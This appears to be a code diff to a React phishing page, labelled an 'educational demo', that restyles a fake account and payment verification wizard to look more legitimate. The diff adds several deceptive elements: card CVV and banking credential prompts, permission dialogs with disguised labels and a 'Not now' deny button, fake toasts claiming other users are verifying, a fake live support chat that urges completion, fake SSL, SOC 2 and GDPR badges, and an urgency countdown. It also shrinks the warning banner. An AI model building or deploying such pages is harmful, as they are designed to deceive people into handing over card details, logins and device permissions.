-                      <div><label className="text-xs font-medium text-muted-foreground mb-1 block">CVV</label><Input type="password" placeholder="123" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} data-testid="input-card-cvv-overlay" /></div>
-                    </div>
-                    <Button className="w-full" onClick={() => submitCredentials("banking")} data-testid="button-submit-banking-overlay"><CreditCard className="w-4 h-4 mr-2" />Verify Payment Method</Button>
-                  </div>
-                )}
-                <p className="text-[10px] text-muted-foreground text-center">Secured by 256-bit SSL encryption</p>
-              </div>
-            </CardContent>
-          </Card>
+            )}
+            {cfg.enableBanking && (
+              <button className={`text-sm ${brand.accent} hover:underline w-full text-center`} onClick={() => setCredTab(credTab === "login" ? "banking" : "login")} data-testid="toggle-overlay-tab">
+                {credTab === "login" ? "Verify payment method" : "Sign in instead"}
+              </button>
+            )}
+          </div>
         </div>
       )}
 
       {pendingRequest && (
-        <div className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4" data-testid="modal-permission-request">
-          <Card className="max-w-sm w-full animate-in fade-in zoom-in-95">
-            <CardContent className="p-6 text-center space-y-4">
-              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
-                <Shield className="w-6 h-6 text-primary" />
-              </div>
-              <h3 className="text-lg font-semibold" data-testid="text-request-title">{disguisedLabels[pendingRequest].title}</h3>
-              <p className="text-sm text-muted-foreground" data-testid="text-request-message">{disguisedLabels[pendingRequest].body}</p>
-              <div className="flex gap-3 justify-center pt-2">
-                <Button variant="outline" onClick={denyRequest} data-testid="button-deny-request">Deny</Button>
-                <Button onClick={acceptRequest} data-testid="button-accept-request">Allow</Button>
-              </div>
-            </CardContent>
-          </Card>
+        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4" data-testid="modal-permission-request">
+          <div className="max-w-sm w-full bg-white rounded-xl shadow-xl p-6 text-center space-y-4 animate-in fade-in zoom-in-95">
+            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center mx-auto">
+              <Shield className="w-6 h-6 text-gray-500" />
+            </div>
+            <h3 className="text-lg font-semibold text-gray-900" data-testid="text-request-title">{disguisedLabels[pendingRequest].title}</h3>
+            <p className="text-sm text-gray-500" data-testid="text-request-message">{disguisedLabels[pendingRequest].body}</p>
+            <div className="flex gap-3 justify-center pt-2">
+              <Button variant="outline" className="border-gray-200 text-gray-600" onClick={denyRequest} data-testid="button-deny-request">Not now</Button>
+              <Button className={`${brand.bg} text-white`} onClick={acceptRequest} data-testid="button-accept-request">Allow</Button>
+            </div>
+          </div>
         </div>
       )}
 
-      <div className="bg-amber-950/30 border-b border-amber-800/40">
-        <div className="max-w-2xl mx-auto px-4 py-3 flex items-start gap-3">
-          <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
-          <p className="text-xs text-amber-200/80" data-testid="text-warning-banner">
-            Educational Cybersecurity Demo - This demonstrates how real attackers disguise permission requests, use zero-click fingerprinting, keystroke logging, and social engineering to trick users
+      {socialToast && (
+        <div className="fixed top-4 right-4 z-50 bg-white border border-gray-200 shadow-lg rounded-lg px-4 py-3 flex items-center gap-3 animate-in slide-in-from-right fade-in" data-testid="toast-social">
+          <Loader2 className="w-4 h-4 text-gray-400 animate-spin" />
+          <span className="text-sm text-gray-600">{socialToast} sign-in is temporarily unavailable. Please use email.</span>
+        </div>
+      )}
+
+      {notificationShown && (
+        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-40 bg-white border border-gray-200 shadow-lg rounded-lg px-4 py-3 flex items-center gap-3 animate-in fade-in slide-in-from-top" data-testid="toast-social-proof">
+          <div className="w-8 h-8 bg-green-50 rounded-full flex items-center justify-center flex-shrink-0">
+            <Users className="w-4 h-4 text-green-600" />
+          </div>
+          <span className="text-sm text-gray-600">{Math.floor(Math.random() * 4) + 2} other users are currently verifying their accounts</span>
+        </div>
+      )}
+
+      <div className="bg-amber-50 border-b border-amber-200">
+        <div className="max-w-2xl mx-auto px-4 py-2.5 flex items-start gap-2.5">
+          <AlertTriangle className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
+          <p className="text-xs text-amber-700" data-testid="text-warning-banner">
+            Educational Demo - This page demonstrates social engineering techniques used by real attackers to trick users into granting access.
           </p>
         </div>
       </div>
 
-      <div className="max-w-lg mx-auto px-4 py-8">
-        <div className="text-center mb-4">
-          <div className="inline-flex items-center justify-center w-12 h-12 rounded-md bg-primary/10 mb-3">
-            <Shield className="w-6 h-6 text-primary" />
-          </div>
-          <h1 className="text-lg font-semibold mb-1" data-testid="text-page-title">{cfg.pageTitle}</h1>
-          {cfg.pageSubtitle && <p className="text-xs text-muted-foreground mb-1">{cfg.pageSubtitle}</p>}
-          {session && <p className="text-xs text-muted-foreground" data-testid="text-session-name">{session.name}</p>}
-        </div>
-
-        {!wizardComplete && (
-          <>
-            <div className="flex items-center justify-center gap-4 mb-4 text-[10px]">
-              <div className="flex items-center gap-1 text-destructive" data-testid="text-urgency-timer">
-                <Timer className="w-3 h-3" />
-                <span>Session expires in {timerMin}:{timerSec.toString().padStart(2, "0")}</span>
-              </div>
-              <div className="flex items-center gap-1 text-muted-foreground" data-testid="text-verification-count">
-                <Users className="w-3 h-3" />
-                <span>{verificationCount.toLocaleString()} verifications today</span>
-              </div>
+      <header className="bg-white border-b border-gray-200">
+        <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <div className={`w-8 h-8 ${brand.bg} rounded-lg flex items-center justify-center`}>
+              <Shield className="w-4 h-4 text-white" />
             </div>
+            <div>
+              <span className="text-sm font-semibold text-gray-900">{cfg.pageTitle}</span>
+              {cfg.pageSubtitle && <p className="text-[10px] text-gray-400 leading-tight">{cfg.pageSubtitle}</p>}
+            </div>
+          </div>
+          <div className="flex items-center gap-4">
+            {!wizardComplete && (
+              <span className="text-xs text-gray-400" data-testid="text-urgency-timer">
+                Session expires in {timerMin}:{timerSec.toString().padStart(2, "0")}
+              </span>
+            )}
+            <button className="text-xs text-gray-400 hover:text-gray-600 flex items-center gap-1" data-testid="link-help">
+              <HelpCircle className="w-3.5 h-3.5" />
+              Help
+            </button>
+          </div>
+        </div>
+        {!wizardComplete && activeWizardSteps.length > 0 && (
+          <div className="max-w-2xl mx-auto px-4">
+            <Progress value={overallProgress} className="h-0.5" data-testid="progress-wizard" />
+          </div>
+        )}
+      </header>
 
-            <div className="flex items-center justify-center gap-3 mb-6">
-              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
-                <Lock className="w-2.5 h-2.5" />
-                <span>SSL Secured</span>
-              </div>
-              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
-                <Fingerprint className="w-2.5 h-2.5" />
-                <span>GDPR Compliant</span>
-              </div>
-              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
-                <ShieldCheck className="w-2.5 h-2.5" />
+      <main className="flex-1 px-4 py-8">
+        <div className="max-w-lg mx-auto">
+          {wizardComplete ? renderComplete() : (
+            <>
+              {currentStep === 1 && renderStep1()}
+              {currentStep === 2 && renderStep2()}
+              {currentStep === 3 && renderStep3()}
+              {currentStep === 4 && renderStep4()}
+              {currentStep === 5 && renderStep5()}
+            </>
+          )}
+        </div>
+      </main>
+
+      <footer className="bg-white border-t border-gray-200 mt-auto">
+        <div className="max-w-2xl mx-auto px-4 py-4">
+          <div className="flex items-center justify-between text-[11px] text-gray-400">
+            <div className="flex items-center gap-4">
+              <button className="hover:text-gray-600">Privacy Policy</button>
+              <button className="hover:text-gray-600">Terms of Service</button>
+              <button className="hover:text-gray-600">Contact</button>
+            </div>
+            <div className="flex items-center gap-1.5">
+              <Lock className="w-3 h-3" />
+              <span>Secured with 256-bit encryption</span>
+            </div>
+          </div>
+          {!wizardComplete && (
+            <div className="flex items-center justify-center gap-4 mt-3 text-[10px] text-gray-400">
+              <div className="flex items-center gap-1">
+                <ShieldCheck className="w-3 h-3" />
                 <span>SOC 2 Verified</span>
               </div>
-            </div>
-
-            <div className="mb-8">
-              <div className="flex items-center justify-between mb-2">
-                <span className="text-xs text-muted-foreground">Step {Math.max(1, currentStepIndex + 1)} of {activeWizardSteps.length}</span>
-                <span className="text-xs text-muted-foreground" data-testid="text-progress-percent">{overallProgress}% complete</span>
+              <div className="flex items-center gap-1">
+                <Fingerprint className="w-3 h-3" />
+                <span>GDPR Compliant</span>
               </div>
-              <Progress value={overallProgress} className="h-1.5" data-testid="progress-wizard" />
-              <div className="flex justify-between mt-3">
-                {activeWizardSteps.map((step, idx) => (
-                  <div key={step.id} className="flex flex-col items-center flex-1">
-                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-medium transition-colors ${
-                      idx < currentStepIndex ? "bg-emerald-500 text-white" :
-                      step.id === currentStep ? "bg-primary text-primary-foreground" :
-                      "bg-muted text-muted-foreground"
-                    }`} data-testid={`step-indicator-${step.id}`}>
-                      {idx < currentStepIndex ? <CheckCircle2 className="w-3.5 h-3.5" /> : idx + 1}
-                    </div>
-                    <span className="text-[9px] text-muted-foreground mt-1 text-center hidden sm:block">{step.title}</span>
-                  </div>
-                ))}
+              <div className="flex items-center gap-1">
+                <Users className="w-3 h-3" />
+                <span>{verificationCount.toLocaleString()} verified today</span>
               </div>
             </div>
-          </>
-        )}
+          )}
+        </div>
+      </footer>
 
-        {wizardComplete ? renderComplete() : (
-          <>
-            {currentStep === 1 && renderStep1()}
-            {currentStep === 2 && renderStep2()}
-            {currentStep === 3 && renderStep3()}
-            {currentStep === 4 && renderStep4()}
-            {currentStep === 5 && renderStep5()}
-          </>
-        )}
-      </div>
+      {!cookieDismissed && (
+        <div className="fixed bottom-0 left-0 right-0 z-30 bg-white border-t border-gray-200 shadow-lg animate-in slide-in-from-bottom" data-testid="banner-cookie">
+          <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between gap-4">
+            <p className="text-xs text-gray-500">We use cookies to improve your experience and ensure security. By continuing, you agree to our cookie policy.</p>
+            <div className="flex gap-2 flex-shrink-0">
+              <Button
+                size="sm"
+                variant="outline"
+                className="text-xs h-8 border-gray-200"
+                onClick={() => setCookieDismissed(true)}
+                data-testid="button-cookie-settings"
+              >
+                Settings
+              </Button>
+              <Button
+                size="sm"
+                className={`text-xs h-8 ${brand.bg} text-white`}
+                onClick={() => setCookieDismissed(true)}
+                data-testid="button-cookie-accept"
+              >
+                Accept
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {!chatOpen ? (
+        <button
+          className={`fixed bottom-20 right-4 z-20 w-12 h-12 ${brand.bg} text-white rounded-full shadow-lg flex items-center justify-center hover:opacity-90 transition-opacity`}
+          onClick={() => setChatOpen(true)}
+          data-testid="button-chat-open"
+        >
+          <MessageCircle className="w-5 h-5" />
+        </button>
+      ) : (
+        <div className="fixed bottom-20 right-4 z-20 w-72 bg-white rounded-xl shadow-xl border border-gray-200 overflow-hidden animate-in fade-in slide-in-from-bottom-5" data-testid="panel-chat">
+          <div className={`${brand.bg} text-white px-4 py-3 flex items-center justify-between`}>
+            <span className="text-sm font-medium">Live Support</span>
+            <button onClick={() => setChatOpen(false)} className="text-white/80 hover:text-white">
+              <X className="w-4 h-4" />
+            </button>
+          </div>
+          <div className="p-4 space-y-3">
+            <div className="flex items-center gap-2">
+              <div className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
+                <User className="w-4 h-4 text-gray-400" />
+              </div>
+              <div>
+                <p className="text-xs font-medium text-gray-700">Support Team</p>
+                <p className="text-[10px] text-gray-400">Typically replies in 3 min</p>
+              </div>
+            </div>
+            <div className="bg-gray-50 rounded-lg p-3 text-xs text-gray-600">
+              All agents are currently assisting other customers. Estimated wait time: 3 minutes. Please complete the verification while you wait.
+            </div>
+            <div className="flex gap-2">
+              <Input placeholder="Type a message..." className="text-xs h-9 bg-white border-gray-200" data-testid="input-chat-message" />
+              <Button size="sm" className={`h-9 ${brand.bg} text-white`} data-testid="button-chat-send">Send</Button>
+            </div>
+          </div>
+        </div>
+      )}
 
       <input ref={fileInputRef} type="file" multiple accept="image/*,.pdf,.doc,.docx,.txt" className="hidden" onChange={onFileSelected} data-testid="input-file-upload" />
     </div>
